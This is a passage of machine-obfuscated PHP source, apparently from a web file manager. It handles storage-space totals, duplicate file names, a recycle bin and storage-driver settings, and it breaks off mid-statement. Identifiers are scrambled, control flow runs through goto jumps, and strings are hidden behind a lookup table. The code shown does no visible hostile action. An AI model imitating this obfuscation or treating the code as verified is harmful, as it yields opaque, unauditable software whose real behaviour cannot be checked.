$A³•†“å”¼ = $this->field($B¸£í´å½Ì)->where($a‹‡¾…Æ†Ï)->select(); goto EÈ‹´éÖ¤; DŸÌ»Œø™: foreach ($dÜ„†ÆÊí as $aÎù °¼Ù) { $b¤À©ö×ãÄ = $aÎù °¼Ù[$B‰˜ß™•Š·[479]] . $B‰˜ß™•Š·[33]; if (!isset($A³•†“å”¼[$b¤À©ö×ãÄ])) { continue; } if ($aÎù °¼Ù[$B‰˜ß™•Š·[414]] == $A³•†“å”¼[$b¤À©ö×ãÄ][$B‰˜ß™•Š·[414]]) { $A³•†“å”¼[$b¤À©ö×ãÄ][$B‰˜ß™•Š·[77]] += $aÎù °¼Ù[$B‰˜ß™•Š·[77]]; } } foreach ($A³•†“å”¼ as $aÎù °¼Ù) { $cãÇœ¨´›­ = $this->parentLevelArray($aÎù °¼Ù[$B‰˜ß™•Š·[477]]); foreach ($cãÇœ¨´›­ as $b¤À©ö×ãÄ) { $b¤À©ö×ãÄ = $b¤À©ö×ãÄ . $B‰˜ß™•Š·[33]; if (!isset($A³•†“å”¼[$b¤À©ö×ãÄ])) { continue; } if ($aÎù °¼Ù[$B‰˜ß™•Š·[414]] == $A³•†“å”¼[$b¤À©ö×ãÄ][$B‰˜ß™•Š·[414]]) { $A³•†“å”¼[$b¤À©ö×ãÄ][$B‰˜ß™•Š·[77]] += $aÎù °¼Ù[$B‰˜ß™•Š·[77]]; } } } $F˜§ô“†÷ = array(); goto eğÀÖªÇ£¹; eğÀÖªÇ£¹: foreach ($A³•†“å”¼ as $aÎù °¼Ù) { if ($aÎù °¼Ù[$B‰˜ß™•Š·[77]] == $aÎù °¼Ù[$B‰˜ß™•Š·[1952]]) { continue; } $F˜§ô“†÷[] = array($B‰˜ß™•Š·[387], $aÎù °¼Ù[$B‰˜ß™•Š·[387]], $B‰˜ß™•Š·[77], $aÎù °¼Ù[$B‰˜ß™•Š·[77]]); } $this->saveAll($F˜§ô“†÷); goto BƒÖ¦ñèñ; EÈ‹´éÖ¤: $a‹‡¾…Æ†Ï[$B‰˜ß™•Š·[388]] = 0; $dÜ„†ÆÊí = $this->field($B¸£í´å½Ì)->where($a‹‡¾…Æ†Ï)->select(); if (!$dÜ„†ÆÊí) { return; } goto cñ¦‰ç¨‰¾; BÚò»éÑŠÄ: $B‰˜ß™•Š· =& $_SERVER[òÀöí]; $this->sourceCacheClear($E¡­ŒÓ†’); $c¬×•Š²ê = $this->sourceInfo($E¡­ŒÓ†’); goto C“ìÕà„Øƒ; cñ¦‰ç¨‰¾: $A³•†“å”¼[] = $c¬×•Š²ê; $A³•†“å”¼ = array_to_keyvalue($A³•†“å”¼, $B‰˜ß™•Š·[387]); foreach ($A³•†“å”¼ as $Cêóã±‘Ö => $aÎù °¼Ù) { $A³•†“å”¼[$Cêóã±‘Ö][$B‰˜ß™•Š·[1952]] = $A³•†“å”¼[$Cêóã±‘Ö][$B‰˜ß™•Š·[77]]; $A³•†“å”¼[$Cêóã±‘Ö][$B‰˜ß™•Š·[77]] = 0; } goto DŸÌ»Œø™; BƒÖ¦ñèñ: } public function userSpaceReset($cŸä’ÊÓ®» = false) { $dŞÕ‡Ù“Ü‘ =& $_SERVER[òÀöí]; $BÉ†“‹º£İ = $this->where(array($dŞÕ‡Ù“Ü‘[389] => self::TYPE_USER, $dŞÕ‡Ù“Ü‘[474] => $cŸä’ÊÓ®», $dŞÕ‡Ù“Ü‘[388] => 0))->sum($dŞÕ‡Ù“Ü‘[77]); Model($dŞÕ‡Ù“Ü‘[492])->userEdit($cŸä’ÊÓ®», array($dŞÕ‡Ù“Ü‘[1649] => $BÉ†“‹º£İ)); } public function targetSpaceUpdate($DÕ×ï¡Ëµè, $d‡èÕ‹ÃÊÛ) { $CïÂÊö¥ƒ† =& $_SERVER[òÀöí]; if (!$d‡èÕ‹ÃÊÛ) { return; } if (!in_array($DÕ×ï¡Ëµè, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $eÄç¼™®ö§ = $this->targetSpaceSize($DÕ×ï¡Ëµè, $d‡èÕ‹ÃÊÛ); if ($DÕ×ï¡Ëµè == self::TYPE_USER) { Model($CïÂÊö¥ƒ†[492])->userEdit($d‡èÕ‹ÃÊÛ, array($CïÂÊö¥ƒ†[1649] => $eÄç¼™®ö§)); } else { if ($DÕ×ï¡Ëµè == self::TYPE_GROUP) { Model($CïÂÊö¥ƒ†[476])->groupEdit($d‡èÕ‹ÃÊÛ, array($CïÂÊö¥ƒ†[1649] => $eÄç¼™®ö§)); } } } public function targetSpaceSize($eŞã®ğó, $Bá„ÙØ™) { goto Bªœ Ş“èÄ; Bƒæì¢ˆ¶: $Dé¥³Ô‚Ÿ = array_to_keyvalue($Dé¥³Ô‚Ÿ, $E™ôâÅ‘Ê[33], $E™ôâÅ‘Ê[387]); $Dé¥³Ô‚Ÿ = array_unique(array_filter($Dé¥³Ô‚Ÿ)); if ($Dé¥³Ô‚Ÿ) { $a§ôä½Ê› = array($E™ôâÅ‘Ê[401] => array($E™ôâÅ‘Ê[402], $Dé¥³Ô‚Ÿ)); $cÙƒôÕ³†³ += floatval($this->where($a§ôä½Ê›)->sum($E™ôâÅ‘Ê[77])); } goto d¦íˆ§ÈË; d¦íˆ§ÈË: return $cÙƒôÕ³†³; goto Cá±„˜ƒÂ”; CÕù÷çÉÄ: $cÙƒôÕ³†³ = floatval($e¿ŒâÃù¶[$E™ôâÅ‘Ê[77]]); $a§ôä½Ê› = array($E™ôâÅ‘Ê[542] => array($E™ôâÅ‘Ê[501], $E™ôâÅ‘Ê[488] . $e¿ŒâÃù¶[$E™ôâÅ‘Ê[387]] . $E™ôâÅ‘Ê[502])); $Dé¥³Ô‚Ÿ = Model($E™ôâÅ‘Ê[412])->field($E™ôâÅ‘Ê[401])->where($a§ôä½Ê›)->select(); goto Bƒæì¢ˆ¶; Bªœ Ş“èÄ: $E™ôâÅ‘Ê =& $_SERVER[òÀöí]; $e¿ŒâÃù¶ = $this->sourceRoot($eŞã®ğó, $Bá„ÙØ™, !0); if (!$e¿ŒâÃù¶) { return 0; } goto CÕù÷çÉÄ; Cá±„˜ƒÂ”: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($BÚğÔ”É’ê) { return $this->fileTypeProfile($BÚğÔ”É’ê, SourceModel::TYPE_USER); } public function groupFileTypeProfile($C‹ÚÑÙ©’) { return $this->fileTypeProfile($C‹ÚÑÙ©’, SourceModel::TYPE_GROUP); } private function fileTypeProfile($aöİ¹Ÿ„ÕÈ, $A¥™±äó‰˜) { goto F˜™ª°°¥„; A·¼·Ì©µÈ: foreach ($eÄò·ŠÒÀõ as $CÏšÉ„‘²Ñ => $càÃß°Ÿö) { $a‹Áª·†°·[$C¼ÖÎÑÉ³Á[390]] = $this->fileTypeWhere($CÏšÉ„‘²Ñ); $dåìç×·Ì[$CÏšÉ„‘²Ñ] = array($C¼ÖÎÑÉ³Á[1955] => $càÃß°Ÿö[$C¼ÖÎÑÉ³Á[28]], $C¼ÖÎÑÉ³Á[1956] => $this->where($a‹Áª·†°·)->count(), $C¼ÖÎÑÉ³Á[537] => $this->where($a‹Áª·†°·)->sum($C¼ÖÎÑÉ³Á[77])); } Cache::set($bâ”«§°Æã, $dåìç×·Ì, 1200); return $dåìç×·Ì; goto bĞÃ‡›Ê›‡; b Èåò‰…: if ($FªºŠƒ¦ƒÁ) { return $FªºŠƒ¦ƒÁ; } $a‹Áª·†°· = array($C¼ÖÎÑÉ³Á[535] => 0); if ($aöİ¹Ÿ„ÕÈ != !1) { $a‹Áª·†°·[$C¼ÖÎÑÉ³Á[474]] = $aöİ¹Ÿ„ÕÈ; $a‹Áª·†°·[$C¼ÖÎÑÉ³Á[389]] = $A¥™±äó‰˜; } goto A•ù–¿„Ş; F˜™ª°°¥„: $C¼ÖÎÑÉ³Á =& $_SERVER[òÀöí]; $bâ”«§°Æã = $C¼ÖÎÑÉ³Á[1953] . $aöİ¹Ÿ„ÕÈ . $C¼ÖÎÑÉ³Á[70] . $A¥™±äó‰˜; $FªºŠƒ¦ƒÁ = Cache::get($bâ”«§°Æã); goto b Èåò‰…; A•ù–¿„Ş: $dåìç×·Ì = array(); $dåìç×·Ì[$C¼ÖÎÑÉ³Á[1954]] = array($C¼ÖÎÑÉ³Á[1955] => LNG($C¼ÖÎÑÉ³Á[1954]), $C¼ÖÎÑÉ³Á[1956] => $this->where($a‹Áª·†°·)->count(), $C¼ÖÎÑÉ³Á[537] => $this->where($a‹Áª·†°·)->sum($C¼ÖÎÑÉ³Á[77])); $eÄò·ŠÒÀõ = KodIO::fileTypeList(); goto A·¼·Ì©µÈ; bĞÃ‡›Ê›‡: } public function fileNameExist($AÓ–Óà«¯ó, $aïÃâ†Š) { $c©êçî¯ =& $_SERVER[òÀöí]; $Côæ¨®ÓÆË = $this->childList($AÓ–Óà«¯ó); foreach ($Côæ¨®ÓÆË as $F®å§ö¤) { if ($F®å§ö¤[$c©êçî¯[28]] == $aïÃâ†Š) { return $F®å§ö¤[$c©êçî¯[387]]; } if (strtolower($F®å§ö¤[$c©êçî¯[28]]) == strtolower($aïÃâ†Š)) { return $F®å§ö¤[$c©êçî¯[387]]; } } return !1; } public function childList($Bâ¬¬åÚã) { goto D¼º„Ó¶ÑÏ; D¼º„Ó¶ÑÏ: $eõæ«¡ƒ¾ =& $_SERVER[òÀöí]; $DªÀ˜íîø = $eõæ«¡ƒ¾[1933] . $Bâ¬¬åÚã; if (isset(self::$cacheChildList[$DªÀ˜íîø])) { return self::$cacheChildList[$DªÀ˜íîø]; } goto A‰—Œ°‘Õ¦; A‰—Œ°‘Õ¦: $C¨‰Öä‚ì = array($eõæ«¡ƒ¾[479] => intval($Bâ¬¬åÚã), $eõæ«¡ƒ¾[414] => 0); $F¬ò“‘Àùµ = $this->where($C¨‰Öä‚ì)->select(); $F¬ò“‘Àùµ = $F¬ò“‘Àùµ ? $F¬ò“‘Àùµ : array(); goto EÒáÀ¢ùÅæ; EÒáÀ¢ùÅæ: self::$cacheChildList[$DªÀ˜íîø] = $F¬ò“‘Àùµ; foreach ($F¬ò“‘Àùµ as $f‡ïäÆçÎÙ) { $DªÀ˜íîø = $eõæ«¡ƒ¾[427] . $f‡ïäÆçÎÙ[$eõæ«¡ƒ¾[387]]; self::$cacheSourceInfo[$DªÀ˜íîø] = $f‡ïäÆçÎÙ; } return $F¬ò“‘Àùµ; goto B­ïŠ»«öØ; B­ïŠ»«öØ: } public function fileNameAuto($fè¬µÇ”¼õ, $D‡†½®´¯ù, $eè¿ÏğÕºÆ = REPEAT_RENAME, $a³µ‹…± = false) { $C¨¥‚ß×´Í =& $_SERVER[òÀöí]; $b¨ùšä‹ë = $this->childList($fè¬µÇ”¼õ); $cÓï°Â¿’ã = array_to_keyvalue($b¨ùšä‹ë, $C¨¥‚ß×´Í[33], $C¨¥‚ß×´Í[28]); return $this->fileNameAutoGet($cÓï°Â¿’ã, $D‡†½®´¯ù, $eè¿ÏğÕºÆ, $a³µ‹…±); } public function fileNameAutoGet($A…¯š‘±, $a‡§©›õÔé, $fß¶Šà‹½, $b©Ë¸•å›ª) { $fœº¸øºßÜ =& $_SERVER[òÀöí]; if ($fß¶Šà‹½ == REPEAT_REPLACE || !$A…¯š‘± || !in_array_not_case($a‡§©›õÔé, $A…¯š‘±) || $b©Ë¸•å›ª && $fß¶Šà‹½ != REPEAT_RENAME_FOLDER) { return $a‡§©›õÔé; } if ($fß¶Šà‹½ == REPEAT_SKIP) { return !1; } $då’¬ï… = $fœº¸øºßÜ[94] . get_path_ext($a‡§©›õÔé); $då’¬ï… = $då’¬ï… == $fœº¸øºßÜ[94] || $b©Ë¸•å›ª ? $fœº¸øºßÜ[33] : $då’¬ï…; for ($bòºˆ˜½æÓ = 1; $bòºˆ˜½æÓ <= count($A…¯š‘±) + 1; $bòºˆ˜½æÓ++) { $C“ĞÖ¼¸ š = substr($a‡§©›õÔé, 0, strlen($a‡§©›õÔé) - strlen($då’¬ï…)); $AÁ•í—„ñ = $C“ĞÖ¼¸ š . "\50{$bòºˆ˜½æÓ}\51{$då’¬ï…}"; if (!in_array_not_case($AÁ•í—„ñ, $A…¯š‘±)) { return $AÁ•í—„ñ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\x65\x5f\x72\x65\x63\x79\x63\154\145"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\151\155\145", "\x74\151\x6d\145", "\151\x6e\163\145\162\x74", "\146\165\x6e\143\164\151\157\x6e")); public function listData($e—¿Úòñ‚ = false) { $D‘ëÍ°øÔ =& $_SERVER[òÀöí]; $e—¿Úòñ‚ = $e—¿Úòñ‚ ? $e—¿Úòñ‚ : USER_ID; $cÔŞ¢Ôœï¼ = $this->where(array($D‘ëÍ°øÔ[1496] => $e—¿Úòñ‚))->select(); return array_to_keyvalue($cÔŞ¢Ôœï¼, $D‘ëÍ°øÔ[33], $D‘ëÍ°øÔ[387]); } public function moveToRecycle($e¥íäÆ­Ùë) { goto d‚™½äœùÕ; e£µ¾ùëˆ: if (!$c¼Ö½Íî° || $c¼Ö½Íî°[$eÒäÉÉœÏ¤[414]] == $eÒäÉÉœÏ¤[86]) { return; } $Døò†…¡ì = array($eÒäÉÉœÏ¤[401] => $e¥íäÆ­Ùë, $eÒäÉÉœÏ¤[1496] => USER_ID, $eÒäÉÉœÏ¤[538] => $c¼Ö½Íî°[$eÒäÉÉœÏ¤[389]], $eÒäÉÉœÏ¤[539] => $c¼Ö½Íî°[$eÒäÉÉœÏ¤[474]], $eÒäÉÉœÏ¤[542] => $c¼Ö½Íî°[$eÒäÉÉœÏ¤[477]]); $this->add($Døò†…¡ì); goto b¦³ß°§ò; d‚™½äœùÕ: $eÒäÉÉœÏ¤ =& $_SERVER[òÀöí]; $DãÀ²Ç± = Model($eÒäÉÉœÏ¤[1181]); $c¼Ö½Íî° = $DãÀ²Ç±->sourceInfo($e¥íäÆ­Ùë); goto e£µ¾ùëˆ; b¦³ß°§ò: $this->recycleMove($e¥íäÆ­Ùë, 1); if ($c¼Ö½Íî°[$eÒäÉÉœÏ¤[388]] == $eÒäÉÉœÏ¤[86]) { $bºÅ……Â— = array($eÒäÉÉœÏ¤[542] => array($eÒäÉÉœÏ¤[501], $c¼Ö½Íî°[$eÒäÉÉœÏ¤[477]] . $e¥íäÆ­Ùë . $eÒäÉÉœÏ¤[502])); $DãÀ²Ç±->where($bºÅ……Â—)->setField($eÒäÉÉœÏ¤[414], 1); } goto F’’ëÑ¢ªÁ; F’’ëÑ¢ªÁ: } public function clear() { $this->remove(!1); } public function remove($cß“«çÙˆ = false) { goto bÛãµ‚©ÍÖ; C¶Ì‘ï—ä¿: $cß“«çÙˆ = $cß“«çÙˆ === !1 ? !1 : $cß“«çÙˆ; $dêøªöÛ¡à = array(); foreach ($F°¬Ò›ëë› as $e¾Ñ“¢ê›) { if ($cß“«çÙˆ != !1 && !in_array($e¾Ñ“¢ê›, $cß“«çÙˆ)) { continue; } $BÖ™œ ªôó = $Fí³ßÖğÉ->sourceInfo($e¾Ñ“¢ê›); $Fí³ßÖğÉ->remove($e¾Ñ“¢ê›, !1); $DŒÆšù†º¿ = $BÖ™œ ªôó[$fÊô² ‘”[389]] . $fÊô² ‘”[70] . $BÖ™œ ªôó[$fÊô² ‘”[474]]; $dêøªöÛ¡à[$DŒÆšù†º¿] = array($fÊô² ‘”[538] => $BÖ™œ ªôó[$fÊô² ‘”[389]], $fÊô² ‘”[474] => $BÖ™œ ªôó[$fÊô² ‘”[474]]); $this->where(array($fÊô² ‘”[387] => $e¾Ñ“¢ê›))->delete(); } goto bßßŸ¶‰; bßßŸ¶‰: foreach ($dêøªöÛ¡à as $eÛå‰Å¬ãß) { $Fí³ßÖğÉ->targetSpaceUpdate($eÛå‰Å¬ãß[$fÊô² ‘”[389]], $eÛå‰Å¬ãß[$fÊô² ‘”[474]]); } goto BÜ”õ¿; bÛãµ‚©ÍÖ: $fÊô² ‘” =& $_SERVER[òÀöí]; $Fí³ßÖğÉ = Model($fÊô² ‘”[1181]); $F°¬Ò›ëë› = $this->listData(); goto C¶Ì‘ï—ä¿; BÜ”õ¿: } public function restore($D”ÕÒË¨†Û = false) { goto e·Ü™¸±Î÷; F´„šô¤Ñ¢: $D”ÕÒË¨†Û = $D”ÕÒË¨†Û == !1 ? !1 : $D”ÕÒË¨†Û; if (!$Fçì»Àö×¤) { return !0; } $bèÌ«¹¦í‰ = array(); goto f²Ö—×˜È; e·Ü™¸±Î÷: $AÁ¶ÚİøÜÑ =& $_SERVER[òÀöí]; $BÈÀççœçÂ = Model($AÁ¶ÚİøÜÑ[1181]); $Fçì»Àö×¤ = $this->listData(); goto F´„šô¤Ñ¢; f²Ö—×˜È: foreach ($Fçì»Àö×¤ as $Dœ»Âø‚») { goto e¬ïõº®·Ö; e¬ïõº®·Ö: if ($D”ÕÒË¨†Û != !1 && !in_array($Dœ»Âø‚», $D”ÕÒË¨†Û)) { continue; } $c¥•ÏššØß = $BÈÀççœçÂ->sourceInfo($Dœ»Âø‚»); $Cæ¦Õ‘æ´² = $BÈÀççœçÂ->sourceInfo($c¥•ÏššØß[$AÁ¶ÚİøÜÑ[479]]); goto d‚ÊÎéß…Î; a¢òáŒİ×»: $bèÌ«¹¦í‰[] = $c¥•ÏššØß[$AÁ¶ÚİøÜÑ[479]]; if ($c¥•ÏššØß[$AÁ¶ÚİøÜÑ[388]] == $AÁ¶ÚİøÜÑ[86]) { $bèÌ«¹¦í‰[] = $Dœ»Âø‚»; } $BÈÀççœçÂ->lockMoveEnd($Dœ»Âø‚»); goto D‹¤ªÕèÀØ; d‚ÊÎéß…Î: if ($Cæ¦Õ‘æ´²[$AÁ¶ÚİøÜÑ[414]] == $AÁ¶ÚİøÜÑ[86]) { continue; } $BÈÀççœçÂ->lockMoveStart($Dœ»Âø‚»); $this->recycleMove($Dœ»Âø‚», 0); goto e®Ó™ôñ†; e®Ó™ôñ†: if ($c¥•ÏššØß[$AÁ¶ÚİøÜÑ[388]] == $AÁ¶ÚİøÜÑ[86]) { $eÂ· Éœ´ = array($AÁ¶ÚİøÜÑ[542] => array($AÁ¶ÚİøÜÑ[501], $c¥•ÏššØß[$AÁ¶ÚİøÜÑ[477]] . $Dœ»Âø‚» . $AÁ¶ÚİøÜÑ[502])); $BÈÀççœçÂ->where($eÂ· Éœ´)->setField($AÁ¶ÚİøÜÑ[414], 0); $this->restoreFolderChildren($Dœ»Âø‚», $Fçì»Àö×¤); } $this->where(array($AÁ¶ÚİøÜÑ[387] => $Dœ»Âø‚»))->delete(); $BÈÀççœçÂ->folderSizeReset($c¥•ÏššØß[$AÁ¶ÚİøÜÑ[479]]); goto a¢òáŒİ×»; D‹¤ªÕèÀØ: } $BÈÀççœçÂ->updateModifyTime($bèÌ«¹¦í‰); goto Eº®ĞØ‡ÅË; Eº®ĞØ‡ÅË: } private function restoreFolderChildren($böŠ´›Ä—„, $FÃñÇˆŒ˜¨) { goto B¼‘ºÌ”÷; B¼‘ºÌ”÷: $FÇÛ½‘Ê½ò =& $_SERVER[òÀöí]; $aÍ¸Õ±Ø˜õ = Model($FÇÛ½‘Ê½ò[1181]); $eçª¼ŠœÛ = array($FÇÛ½‘Ê½ò[387] => array($FÇÛ½‘Ê½ò[7], array())); goto aÛ¤Å¿Óò; B™ƒÒ…ˆ›Ï: $eçª¼ŠœÛ[$FÇÛ½‘Ê½ò[387]][1] = array_unique($eçª¼ŠœÛ[$FÇÛ½‘Ê½ò[387]][1]); $eçª¼ŠœÛ[$FÇÛ½‘Ê½ò[936]] = $FÇÛ½‘Ê½ò[1752]; $aÍ¸Õ±Ø˜õ->where($eçª¼ŠœÛ)->setField($FÇÛ½‘Ê½ò[414], 1); goto Cäîğ¡ÔÍÅ; aÛ¤Å¿Óò: foreach ($FÃñÇˆŒ˜¨ as $fœ¾Ò·Ú) { if ($fœ¾Ò·Ú == $böŠ´›Ä—„) { continue; } if (!$aÍ¸Õ±Ø˜õ->isParentOf($böŠ´›Ä—„, $fœ¾Ò·Ú)) { continue; } $EÍ‚Äƒéó = $aÍ¸Õ±Ø˜õ->sourceInfo($fœ¾Ò·Ú); if ($EÍ‚Äƒéó[$FÇÛ½‘Ê½ò[388]] == $FÇÛ½‘Ê½ò[86]) { $eçª¼ŠœÛ[] = array($FÇÛ½‘Ê½ò[542] => array($FÇÛ½‘Ê½ò[501], $EÍ‚Äƒéó[$FÇÛ½‘Ê½ò[477]] . $fœ¾Ò·Ú . $FÇÛ½‘Ê½ò[502])); } else { $eçª¼ŠœÛ[$FÇÛ½‘Ê½ò[387]][1][] = $fœ¾Ò·Ú; } } if (!$eçª¼ŠœÛ[$FÇÛ½‘Ê½ò[387]][1]) { unset($eçª¼ŠœÛ[$FÇÛ½‘Ê½ò[387]]); } if (!$eçª¼ŠœÛ) { return; } goto B™ƒÒ…ˆ›Ï; Cäîğ¡ÔÍÅ: } private function recycleMove($eàÉ²ö•¦, $e˜Ğ­¥ë÷ø = 1) { $b„©ÙŒââ =& $_SERVER[òÀöí]; $báº”§›É  = Model($b„©ÙŒââ[1181]); $b¿ÖÓ‚ÈÑ“ = Model($b„©ÙŒââ[1957]); $D»Ÿæ‘ = array($b„©ÙŒââ[387] => $eàÉ²ö•¦); if ($e˜Ğ­¥ë÷ø) { $báº”§›É ->where($D»Ÿæ‘)->setField($b„©ÙŒââ[414], 1); $b¿ÖÓ‚ÈÑ“->eventRecycle($eàÉ²ö•¦, $b„©ÙŒââ[1958]); } else { $c±÷ŒÑ‹È = $báº”§›É ->where($D»Ÿæ‘)->find(); $Eæ–»ğ‡íÄ = $c±÷ŒÑ‹È[$b„©ÙŒââ[388]] == $b„©ÙŒââ[86]; $B¡ËÚğÒÒ² = $báº”§›É ->fileNameAuto($c±÷ŒÑ‹È[$b„©ÙŒââ[479]], $c±÷ŒÑ‹È[$b„©ÙŒââ[28]], REPEAT_RENAME_FOLDER, $Eæ–»ğ‡íÄ); if ($B¡ËÚğÒÒ² != $c±÷ŒÑ‹È[$b„©ÙŒââ[28]]) { $báº”§›É ->rename($eàÉ²ö•¦, $B¡ËÚğÒÒ²); } $báº”§›É ->where($D»Ÿæ‘)->setField($b„©ÙŒââ[414], 0); $b¿ÖÓ‚ÈÑ“->eventRecycle($eàÉ²ö•¦, $b„©ÙŒââ[1959]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x73\x74\x6f\x72\141\x67\145\114\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\151\x7a\145\115\141\x78", "\163\x79\x73\164\145\155", "\144\x65\x66\141\x75\154\x74", "\144\162\x69\x76\x65\162", "\x63\x6f\x6e\146\151\x67"); public function listData($d¬Ø¬ÀÒ = false, $Cßä¤°‡Œ¢ = "\155\157\144\151\x66\x79\x54\151\x6d\145", $b–è»ÏÃ¼Ö = false) { goto CçŠœñ¨Ü; b“Áù¾ïÈÇ: foreach ($f¡®‚â¡ as $cº±Õª·ºË => $d„Çù¢ô¬) { unset($f¡®‚â¡[$cº±Õª·ºË][$fµŸÆÅ»[6]]); $f¡®‚â¡[$cº±Õª·ºË][$fµŸÆÅ»[1649]] = 0; } $BíËë¡š»½ = array_to_keyvalue($f¡®‚â¡, $fµŸÆÅ»[33], $fµŸÆÅ»[385]); $this->_listAppendSize($f¡®‚â¡, $BíËë¡š»½); goto D–÷ì²ÎŒ±; CçŠœñ¨Ü: $fµŸÆÅ» =& $_SERVER[òÀöí]; $f¡®‚â¡ = parent::listData($d¬Ø¬ÀÒ, $Cßä¤°‡Œ¢, $b–è»ÏÃ¼Ö); if ($d¬Ø¬ÀÒ) { return $f¡®‚â¡; } goto b“Áù¾ïÈÇ; D–÷ì²ÎŒ±: return $f¡®‚â¡; goto Aö„ö¶óò; Aö„ö¶óò: } public function _listAppendSize(&$Dáˆ±–¾, $FÍ±÷µÃõË) { $BÄ²Ú’Ñæâ =& $_SERVER[òÀöí]; if (!$FÍ±÷µÃõË) { return; } $B‘ªŸø¦Ÿš = $BÄ²Ú’Ñæâ[1960] . implode($BÄ²Ú’Ñæâ[47], $FÍ±÷µÃõË) . $BÄ²Ú’Ñæâ[1961]; $Ağ¿ÆÄÑ“Õ = Model($BÄ²Ú’Ñæâ[737])->query($B‘ªŸø¦Ÿš); $Ağ¿ÆÄÑ“Õ = array_to_keyvalue($Ağ¿ÆÄÑ“Õ, $BÄ²Ú’Ñæâ[385], $BÄ²Ú’Ñæâ[77]); foreach ($Dáˆ±–¾ as $fÛ—è×¦ïš => $cñ‰‹¨Åá¶) { $Dáˆ±–¾[$fÛ—è×¦ïš][$BÄ²Ú’Ñæâ[1649]] = isset($Ağ¿ÆÄÑ“Õ[$cñ‰‹¨Åá¶[$BÄ²Ú’Ñæâ[385]]]) ? $Ağ¿ÆÄÑ“Õ[$cñ‰‹¨Åá¶[$BÄ²Ú’Ñæâ[385]]] : 0; } } public function getConfig($eŠ¼ã£íŒ) { $DèÅÕÑƒ—¢ = parent::listData($eŠ¼ã£íŒ); return json_decode($DèÅÕÑƒ—¢[$_SERVER[òÀöí][6]], !0); } public function update($f•¤˜‹ä½¢, $bø‰Æ³ò™‚) { goto e¤Û•˜›¦; a÷”²¹‚Ü²: $dğÊ¡ï = parent::update($f•¤˜‹ä½¢, $bø‰Æ³ò™‚); if ($dğÊ¡ï && $bø‰Æ³ò™‚[$f“èŠÆÎâÉ[34]]) { foreach ($e›œ‹Â–˜ù as $e²¦ˆ±¤·) { if ($e²¦ˆ±¤·[$f“èŠÆÎâÉ[34]] && $e²¦ˆ±¤·[$f“èŠÆÎâÉ[385]] != $f•¤˜‹ä½¢) { parent::update($e²¦ˆ±¤·[$f“èŠÆÎâÉ[385]], array($f“èŠÆÎâÉ[34] => 0)); } } } return $dğÊ¡ï; goto D¼Õ§Ëí–; fÍŠèÄÊÅ: if (isset($e›œ‹Â–˜ù[$cšÃš“«]) && $e›œ‹Â–˜ù[$cšÃš“«][$f“èŠÆÎâÉ[385]] != $f•¤˜‹ä½¢) { return !1; } if (isset($bø‰Æ³ò™‚[$f“èŠÆÎâÉ[1962]]) && $bø‰Æ³ò™‚[$f“èŠÆÎâÉ[1962]] == $f“èŠÆÎâÉ[86]) { $this->checkConfig($bø‰Æ³ò™‚); } unset($bø‰Æ³ò™‚[$f“èŠÆÎâÉ[1962]]); goto a÷”²¹‚Ü²; e¤Û•˜›¦: $f“èŠÆÎâÉ =& $_SERVER[òÀöí]; $cšÃš“« = $bø‰Æ³ò™‚[$f“èŠÆÎâÉ[28]]; $e›œ‹Â–˜ù = array_to_keyvalue(parent::listData(), $f“èŠÆÎâÉ[28]); goto fÍŠèÄÊÅ; D¼Õ§Ëí–: } public function add($fÀğ«ÑÔ§¼) { goto a¶¸¾Ï›º; F‹âçµÜÊ: $this->checkConfig($fÀğ«ÑÔ§¼); $bÏÕëÂŒ¾è = parent::insert($fÀğ«ÑÔ§¼); if ($bÏÕëÂŒ¾è && $fÀğ«ÑÔ§¼[$bëÅ¿©†Ê…[34]]) { foreach ($bˆà˜î¯å± as $B°…„‡²Ï‘) { if ($B°…„‡²Ï‘[$bëÅ¿©†Ê…[34]]) { parent::update($B°…„‡²Ï‘[$bëÅ¿©†Ê…[385]], array($bëÅ¿©†Ê…[34] => 0)); } } } goto aí—Ñ¯ö«Ó; a¶¸¾Ï›º: $bëÅ¿©†Ê… =& $_SERVER[òÀöí]; $bˆà˜î¯å± = array_to_keyvalue(parent::listData(), $bëÅ¿©†Ê…[28]); if (isset($bˆà˜î¯å±[$fÀğ«ÑÔ§¼[$bëÅ¿©†Ê…[28]]])) { return !1; } goto F‹âçµÜÊ; aí—Ñ¯ö«Ó: return $bÏÕëÂŒ¾è; goto b‹åîŸ›êæ; b‹åîŸ›êæ: } public function checkConfig(&$aİÏ—¬†Œ») { goto cŸ·å‡„×à; CàëÕ–: $aİÏ—¬†Œ»[$d¤á‘Ï›·[6]] = json_encode($dóŒÒÈàçğ); $aİÏ—¬†Œ»[$d¤á‘Ï›·[93]] = $FÄ÷»´‘; return !0; goto fÍ·¸è‚ãœ; cŸ·å‡„×à: $d¤á‘Ï›· =& $_SERVER[òÀöí]; $F·…ªİÄÏĞ = strtolower($aİÏ—¬†Œ»[$d¤á‘Ï›·[93]]); $dóŒÒÈàçğ = json_decode($aİÏ—¬†Œ»[$d¤á‘Ï›·[6]], !0); goto E˜‚¡‘Ù¢¨; E˜‚¡‘Ù¢¨: foreach ($dóŒÒÈàçğ as $c„±‘Ï‘´ğ => $d†ŒÙ–§ìÂ) { $dóŒÒÈàçğ[$c„±‘Ï‘´ğ] = trim($d†ŒÙ–§ìÂ); } $dóŒÒÈàçğ[$d¤á‘Ï›·[1963]] = rand_string(6); $Eã§—¸Û×¾ = $GLOBALS[$d¤á‘Ï›·[6]][$d¤á‘Ï›·[87]][$d¤á‘Ï›·[779]]; goto D¯Ê›É¹ö”; D¯Ê›É¹ö”: $FÄ÷»´‘ = isset($Eã§—¸Û×¾[$F·…ªİÄÏĞ]) ? $Eã§—¸Û×¾[$F·…ªİÄÏĞ] : ucfirst($F·…ªİÄÏĞ); $dã½¸µÓ¯Š = $d¤á‘Ï›·[71] . $FÄ÷»´‘; if (!$FÄ÷»´‘ || !class_exists($dã½¸µÓ¯Š)) { write_log(array($d¤á‘Ï›·[1964], $aİÏ—¬†Œ», get_caller_info()), $d¤á‘Ï›·[1965]); show_json(LNG($d¤á‘Ï›·[1966]), !1, $aİÏ—¬†Œ»); } goto a¿ŒÓšµèŠ; b´øÎßÁ÷Ş: $F–ŠãÖŸÕ = $d¨Šô©®®->getPath($Cë¥êÕç . 